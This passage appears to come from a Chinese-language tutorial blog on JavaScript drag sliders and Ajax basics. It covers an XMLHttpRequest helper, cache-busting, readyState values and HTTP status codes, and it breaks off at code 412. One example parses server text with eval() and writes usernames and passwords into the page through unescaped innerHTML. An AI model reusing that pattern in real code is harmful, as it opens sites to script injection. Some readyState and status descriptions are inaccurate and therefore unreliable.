l=0;</span><br><span class="line">			&#125;</span><br><span class="line">			else if(l&gt;oParent.offsetWidth-oDiv.offsetWidth)</span><br><span class="line">			&#123;</span><br><span class="line">				l=oParent.offsetWidth-oDiv.offsetWidth;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			oDiv.style.left=l+&apos;px&apos;;</span><br><span class="line">			</span><br><span class="line">			var scale=l/(oParent.offsetWidth-oDiv.offsetWidth);</span><br><span class="line">			document.title=scale;</span><br><span class="line">			</span><br><span class="line">			oDiv2.style.width=400*scale+&apos;px&apos;;</span><br><span class="line">			oDiv2.style.height=400*scale+&apos;px&apos;;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		document.onmouseup=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			document.onmousemove=null;</span><br><span class="line">			document.onmouseup=null;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		return false;	//chrome、ff、IE9</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;parent&quot;&gt;</span><br><span class="line">	&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="例子2控制物体的透明度">例子2：控制物体的透明度</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#parent &#123;width:600px; height:20px; background:#CCC; position:relative; margin:10px auto;&#125;</span><br><span class="line">#div1 &#123;width:20px; height:20px; background:red; position:absolute; left:0; top:0;&#125;</span><br><span class="line">#div2 &#123;width:300px; height:300px; background:green; filter:alpha(opacity:0); opacity:0;&#125;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	var oDiv2=document.getElementById(&apos;div2&apos;);</span><br><span class="line">	var oParent=document.getElementById(&apos;parent&apos;);</span><br><span class="line">	</span><br><span class="line">	var disX=0;</span><br><span class="line">	</span><br><span class="line">	oDiv.onmousedown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</span><br><span class="line">				</span><br><span class="line">		document.onmousemove=function (ev)</span><br><span class="line">		&#123;</span><br><span class="line">			var oEvent=ev||event;</span><br><span class="line">			var l=oEvent.clientX-disX;</span><br><span class="line">			</span><br><span class="line">			if(l&lt;0)</span><br><span class="line">			&#123;</span><br><span class="line">				l=0;</span><br><span class="line">			&#125;</span><br><span class="line">			else if(l&gt;oParent.offsetWidth-oDiv.offsetWidth)</span><br><span class="line">			&#123;</span><br><span class="line">				l=oParent.offsetWidth-oDiv.offsetWidth;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			oDiv.style.left=l+&apos;px&apos;;</span><br><span class="line">			</span><br><span class="line">			var scale=l/(oParent.offsetWidth-oDiv.offsetWidth);</span><br><span class="line">			document.title=scale;</span><br><span class="line">			</span><br><span class="line">			oDiv2.style.filter=&apos;alpha(opacity:&apos;+scale*100+&apos;)&apos;;</span><br><span class="line">			oDiv2.style.opacity=scale;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		document.onmouseup=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			document.onmousemove=null;</span><br><span class="line">			document.onmouseup=null;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		return false;	//chrome、ff、IE9</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;parent&quot;&gt;</span><br><span class="line">	&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="例子3控制文字滚动">例子3：控制文字滚动</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#parent &#123;width:600px; height:20px; background:#CCC; position:relative; margin:10px auto;&#125;</span><br><span class="line">#div1 &#123;width:20px; height:20px; background:red; position:absolute; left:0; top:0;&#125;</span><br><span class="line">#div2 &#123;width:400px; height:300px; border:1px solid black; overflow:hidden; position:relative;&#125;</span><br><span class="line">#div3 &#123;position:absolute; left:0; top:0; padding:4px;&#125;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	var oDiv2=document.getElementById(&apos;div2&apos;);</span><br><span class="line">	var oDiv3=document.getElementById(&apos;div3&apos;);</span><br><span class="line">	var oParent=document.getElementById(&apos;parent&apos;);</span><br><span class="line">	</span><br><span class="line">	var disX=0;</span><br><span class="line">	</span><br><span class="line">	oDiv.onmousedown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		var oEvent=ev||event;</span><br><span class="line">		</span><br><span class="line">		disX=oEvent.clientX-oDiv.offsetLeft;</span><br><span class="line">				</span><br><span class="line">		document.onmousemove=function (ev)</span><br><span class="line">		&#123;</span><br><span class="line">			var oEvent=ev||event;</span><br><span class="line">			var l=oEvent.clientX-disX;</span><br><span class="line">			</span><br><span class="line">			if(l&lt;0)</span><br><span class="line">			&#123;</span><br><span class="line">				l=0;</span><br><span class="line">			&#125;</span><br><span class="line">			else if(l&gt;oParent.offsetWidth-oDiv.offsetWidth)</span><br><span class="line">			&#123;</span><br><span class="line">				l=oParent.offsetWidth-oDiv.offsetWidth;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			oDiv.style.left=l+&apos;px&apos;;</span><br><span class="line">			</span><br><span class="line">			var scale=l/(oParent.offsetWidth-oDiv.offsetWidth);</span><br><span class="line">			document.title=scale;</span><br><span class="line">			</span><br><span class="line">			oDiv3.style.top=-scale*(oDiv3.offsetHeight-oDiv2.offsetHeight)+&apos;px&apos;;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		document.onmouseup=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			document.onmousemove=null;</span><br><span class="line">			document.onmouseup=null;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		return false;	//chrome、ff、IE9</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;parent&quot;&gt;</span><br><span class="line">	&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div2&quot;&gt;</span><br><span class="line">	&lt;div id=&quot;div3&quot;&gt;    </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h1><span id="ajax基础">Ajax基础</span></h1><h2><span id="什么是-ajax">什么是 Ajax</span></h2><p>AJAX = 异步 JavaScript 和 XML。<br>AJAX 是一种用于创建快速动态网页的技术。<br>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<h3><span id="ajaxjs">Ajax.js</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">function ajax(url, fnSucc, fnFaild)</span><br><span class="line">&#123;</span><br><span class="line">	//1.创建Ajax对象</span><br><span class="line">	if(window.XMLHttpRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		var oAjax=new XMLHttpRequest();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		var oAjax=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//2.连接服务器（打开和服务器的连接）</span><br><span class="line">	oAjax.open(&apos;GET&apos;, url, true);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	//3.发送</span><br><span class="line">	oAjax.send();</span><br><span class="line">	</span><br><span class="line">	//4.接收</span><br><span class="line">	oAjax.onreadystatechange=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		if(oAjax.readyState==4)</span><br><span class="line">		&#123;</span><br><span class="line">			if(oAjax.status==200)</span><br><span class="line">			&#123;</span><br><span class="line">				//alert(&apos;成功了：&apos;+oAjax.responseText);</span><br><span class="line">				fnSucc(oAjax.responseText);</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				//alert(&apos;失败了&apos;);</span><br><span class="line">				if(fnFaild)</span><br><span class="line">				&#123;</span><br><span class="line">					fnFaild();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="使用ajax">使用Ajax</span></h2><h3><span id="基础请求并显示静态txt文件">基础：请求并显示静态TXT文件</span></h3><ul>
<li>字符集编码（统一编码）</li>
<li>缓存、阻止缓存<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;ajax.js&quot;&gt;&lt;/script&gt;  //引用ajax.js</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		ajax(&apos;aaa.txt&apos;, function (str)&#123;</span><br><span class="line">			alert(str);</span><br><span class="line">		&#125;, function ()&#123;</span><br><span class="line">			alert(&apos;失败&apos;);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;1input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;读取&quot; /&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="阻止缓存">阻止缓存</span></h4><ul>
<li>ajax(‘aaa.txt?t=’+new Date().getTime(), function (str)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		ajax(&apos;aaa.txt?t=&apos;+new Date().getTime(), function (str)&#123;</span><br><span class="line">			alert(str);</span><br><span class="line">		&#125;, function ()&#123;</span><br><span class="line">			alert(&apos;失败&apos;);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="动态数据请求js或json文件">动态数据：请求JS（或Json）文件</span></h3><ul>
<li>eval的使用</li>
<li>DOM创建元素<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;ajax.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oBtn=document.getElementById(&apos;btn1&apos;);</span><br><span class="line">	var oUl=document.getElementById(&apos;ul1&apos;);</span><br><span class="line">	</span><br><span class="line">	oBtn.onclick=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		ajax(&apos;data.txt?t=&apos;+new Date().getTime(), function (str)&#123;</span><br><span class="line">			var arr=eval(str);</span><br><span class="line">			</span><br><span class="line">			for(var i=0;i&lt;arr.length;i++)</span><br><span class="line">			&#123;</span><br><span class="line">				var oLi=document.createElement(&apos;li&apos;);</span><br><span class="line">				</span><br><span class="line">				oLi.innerHTML=&apos;用户名：&lt;strong&gt;&apos;+arr[i].user+&apos;&lt;/strong&gt;密码：&lt;span&gt;&apos;+arr[i].pass+&apos;&lt;/span&gt;&apos;;</span><br><span class="line">				</span><br><span class="line">				oUl.appendChild(oLi);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;, function ()&#123;</span><br><span class="line">			alert(&apos;失败&apos;);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;1input id=&quot;btn1&quot; type=&quot;button&quot; value=&quot;读取&quot; /&gt;</span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2><span id="ajax原理">Ajax原理</span></h2><h3><span id="http请求方法">HTTP请求方法</span></h3><ul>
<li>GET方法是默认的HTTP请求方法，我们日常用GET方法来提交表单数据，然而用GET方法提交的表单数据只经过了简单的编码，同时它将作为URL的一部分向Web服务器发送，因此，如果使用GET方法来提交表单数据就存在着安全隐患上</li>
<li>POST方法是GET方法的一个替代方法，它主要是向Web服务器提交表单数据，尤其是大批量的数据。POST方法克服了GET方法的一些缺点。通过POST方法提交表单数据时，数据不是作为URL请求的一部分而是作为标准数据传送给Web服务器，这就克服了GET方法中的信息无法保密和数据量太小的缺点。</li>
</ul>
<h1><span id="ajax中级">Ajax中级</span></h1><h2><span id="编写ajax-1">编写Ajax-1</span></h2><h3><span id="创建ajax对象">创建Ajax对象</span></h3><ul>
<li>ActiveXObject(“Microsoft.XMLHTTP”)   //IE6</li>
<li>XMLHttpRequest()</li>
<li>全局变量是window的属性</li>
<li>用没定义的变量–报错</li>
<li>用没有定义的属性–undefined</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//1.创建Ajax对象 用属性的形式来判断</span><br><span class="line">if(window.XMLHttpRequest)</span><br><span class="line">&#123;</span><br><span class="line">	var oAjax=new XMLHttpRequest();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	var oAjax=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="连接服务器">连接服务器</span></h3><ul>
<li>open(方法, 文件名, 异步传输)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//2.连接服务器</span><br><span class="line">//open(方法, 文件名, 异步传输)</span><br><span class="line">oAjax.open(&apos;GET&apos;, &apos;a.txt&apos;, true);</span><br></pre></td></tr></table></figure>
<h4><span id="同步和异步">同步和异步</span></h4><ul>
<li>同步传输（一步一步）是一种以数据块为传输单位的数据传输方式，该方式下数据块与数据块之间的时间间隔是固定的，必须严格地规定它们的时间关系。每个数据块的头部和尾部都要附加一个特殊的字符或比特序列，标记一个数据块的开始和结束，一般还要附加一个校验序列，以便对数据块进行差错控制。</li>
<li>异步传输（一起）将比特分成小组进行传送，小组可以是8位的1个字符或更长。发送方可以在任何时刻发送这些比特组，而接收方从不知道它们会在什么时候到达。</li>
<li>Ajax就是用异步传输</li>
</ul>
<h3><span id="发送请求">发送请求</span></h3><ul>
<li>send()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oAjax.send();</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="接收返回值">接收返回值</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//4.接收返回</span><br><span class="line">oAjax.onreadystatechange=function ()</span><br><span class="line">&#123;</span><br><span class="line">	//oAjax.readyState	//浏览器和服务器，进行到哪一步了</span><br><span class="line">	if(oAjax.readyState==4)	//读取完成</span><br><span class="line">	&#123;</span><br><span class="line">		if(oAjax.status==200)	//成功</span><br><span class="line">		&#123;</span><br><span class="line">			alert(&apos;成功：&apos;+oAjax.responseText);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			alert(&apos;失败:&apos;+oAjax.status);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3><span id="ajax">Ajax</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">function ajax(url, fnSucc, fnFaild)</span><br><span class="line">&#123;</span><br><span class="line">	//1.创建Ajax对象</span><br><span class="line">	if(window.XMLHttpRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		var oAjax=new XMLHttpRequest();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		var oAjax=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//2.连接服务器</span><br><span class="line">	//open(方法, 文件名, 异步传输)</span><br><span class="line">	oAjax.open(&apos;GET&apos;, url, true);</span><br><span class="line">	</span><br><span class="line">	//3.发送请求</span><br><span class="line">	oAjax.send();</span><br><span class="line">	</span><br><span class="line">	//4.接收返回</span><br><span class="line">	oAjax.onreadystatechange=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		//oAjax.readyState	//浏览器和服务器，进行到哪一步了</span><br><span class="line">		if(oAjax.readyState==4)	//读取完成</span><br><span class="line">		&#123;</span><br><span class="line">			if(oAjax.status==200)	//成功</span><br><span class="line">			&#123;</span><br><span class="line">				fnSucc(oAjax.responseText);</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				if(fnFaild)</span><br><span class="line">				&#123;</span><br><span class="line">					fnFaild(oAjax.status);</span><br><span class="line">				&#125;</span><br><span class="line">				//alert(&apos;失败:&apos;+oAjax.status);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="编写ajax-2">编写Ajax - 2</span></h2><h3><span id="请求状态监控">请求状态监控</span></h3><h4><span id="onreadystatechange事件">onreadystatechange事件</span></h4><ul>
<li>onreadystatechange     存储函数（或函数名</li>
<li>每当 readyState 属性改变时，就会调用该函数。</li>
</ul>
<h4><span id="readystate属性请求状态">readyState属性：请求状态</span></h4><table>
<thead>
<tr>
<th>readyState属性值</th>
<th style="text-align:left">请求状态</th>
</tr>
</thead>
<tbody>
<tr>
<td>0  （未初始化）</td>
<td style="text-align:left">还没有调用open()方法</td>
</tr>
<tr>
<td>1  （载入）</td>
<td style="text-align:left">已调用send()方法，正在发送请求</td>
</tr>
<tr>
<td>2  （载入完成）</td>
<td style="text-align:left">send()方法完成，已收到全部响应内容</td>
</tr>
<tr>
<td>3  （解析）</td>
<td style="text-align:left">正在解析响应内容</td>
</tr>
<tr>
<td>4  （完成）</td>
<td style="text-align:left">响应内容解析完成，可以在客户端调用了</td>
</tr>
</tbody>
</table>
<h4><span id="status属性请求结果">status属性：请求结果</span></h4><h5><span id="1xx临时响应">1xx（临时响应）</span></h5><p>表示临时响应并需要请求者继续执行操作的状态代码。</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>100   （继续）</td>
<td style="text-align:left">请求者应当继续提出请求。 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。</td>
</tr>
<tr>
<td>101   （切换协议）</td>
<td style="text-align:left">请求者已要求服务器切换协议，服务器已确认并准备切换。</td>
</tr>
</tbody>
</table>
<h5><span id="2xx-成功">2xx （成功）</span></h5><p>表示成功处理了请求的状态代码。</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>200   （成功）</td>
<td style="text-align:left">服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页。</td>
</tr>
<tr>
<td>201   （已创建）</td>
<td style="text-align:left">请求成功并且服务器创建了新的资源。</td>
</tr>
<tr>
<td>202   （已接受）</td>
<td style="text-align:left">服务器已接受请求，但尚未处理。</td>
</tr>
<tr>
<td>203   （非授权信息）</td>
<td style="text-align:left">服务器已成功处理了请求，但返回的信息可能来自另一来源。</td>
</tr>
<tr>
<td>204   （无内容）</td>
<td style="text-align:left">服务器成功处理了请求，但没有返回任何内容。</td>
</tr>
<tr>
<td>205   （重置内容）</td>
<td style="text-align:left">服务器成功处理了请求，但没有返回任何内容。</td>
</tr>
<tr>
<td>206   （部分内容）</td>
<td style="text-align:left">服务器成功处理了部分 GET 请求。</td>
</tr>
</tbody>
</table>
<h5><span id="3xx-重定向">3xx （重定向）</span></h5><p>表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>300   （多种选择）</td>
<td style="text-align:left">针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。</td>
</tr>
<tr>
<td>301   （永久移动）</td>
<td style="text-align:left">请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。</td>
</tr>
<tr>
<td>302   （临时移动）</td>
<td style="text-align:left">服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td>
</tr>
<tr>
<td>303   （查看其他位置）</td>
<td style="text-align:left">请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。</td>
</tr>
<tr>
<td>304   （未修改）</td>
<td style="text-align:left">自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。</td>
</tr>
<tr>
<td>305   （使用代理）</td>
<td style="text-align:left">请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理。</td>
</tr>
<tr>
<td>307   （临时重定向）</td>
<td style="text-align:left">服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td>
</tr>
</tbody>
</table>
<h5><span id="4xx请求错误">4xx（请求错误）</span></h5><p>这些状态代码表示请求可能出错，妨碍了服务器的处理。</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>400   （错误请求）</td>
<td style="text-align:left">服务器不理解请求的语法。</td>
</tr>
<tr>
<td>401   （未授权）</td>
<td style="text-align:left">请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。</td>
</tr>
<tr>
<td>403   （禁止）</td>
<td style="text-align:left">服务器拒绝请求。</td>
</tr>
<tr>
<td>404   （未找到）</td>
<td style="text-align:left">服务器找不到请求的网页。</td>
</tr>
<tr>
<td>405   （方法禁用）</td>
<td style="text-align:left">禁用请求中指定的方法。</td>
</tr>
<tr>
<td>406   （不接受）</td>
<td style="text-align:left">无法使用请求的内容特性响应请求的网页。</td>
</tr>
<tr>
<td>407   （需要代理授权）</td>
<td style="text-align:left">此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。</td>
</tr>
<tr>
<td>408   （请求超时）</td>
<td style="text-align:left">服务器等候请求时发生超时。</td>
</tr>
<tr>
<td>409   （冲突）</td>
<td style="text-align:left">服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。</td>
</tr>
<tr>
<td>410   （已删除）</td>
<td style="text-align:left">如果请求的资源已永久删除，服务器就会返回此响应。</td>
</tr>
<tr>
<td>411   （需要有效长度）</td>
<td style="text-align:left">服务器不接受不含有效内容长度标头字段的请求。</td>
</tr>
<tr>
<td>412   （未满足前提条件）</td>
